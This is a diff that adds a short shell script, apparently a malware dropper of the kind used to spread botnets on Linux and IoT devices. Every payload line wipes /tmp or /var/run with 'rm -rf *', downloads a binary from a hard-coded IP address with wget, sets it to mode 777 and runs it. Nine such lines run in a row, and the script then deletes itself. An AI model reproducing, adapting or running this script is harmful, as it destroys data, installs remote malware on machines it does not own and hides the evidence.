@@ -1,0 +1,16 @@
+#!/bin/sh
+
+ulimit -n 712
+
+cd /tmp || cd /var/run; rm -rf *; wget http://212.237.6.235/nbhu; chmod 777 nbhu; ./nbhu
+cd /tmp || cd /var/run; rm -rf *; wget http://212.237.6.235/bnueq; chmod 777 bnueq; ./bnueq
+cd /tmp || cd /var/run; rm -rf *; wget http://212.237.6.235/zmzwi; chmod 777 zmzwi; ./zmzwi
+cd /tmp || cd /var/run; rm -rf *; wget http://212.237.6.235/miwji8; chmod 777 miwji8; ./miwji8
+cd /tmp || cd /var/run; rm -rf *; wget http://212.237.6.235/qopeo3; chmod 777 qopeo3; ./qopeo3
+cd /tmp || cd /var/run; rm -rf *; wget http://212.237.6.235/uemw82; chmod 777 uemw82; ./uemw82
+cd /tmp || cd /var/run; rm -rf *; wget http://212.237.6.235/vneue3; chmod 777 vneue3; ./vneue3
+cd /tmp || cd /var/run; rm -rf *; wget http://212.237.6.235/bnrue; chmod 777 bnrue; ./bnrue
+cd /tmp || cd /var/run; rm -rf *; wget http://212.237.6.235/Ioopw; chmod 777 Ioopw; ./Ioopw
+
+sleep 3; 
+rm -rf booxie.sh
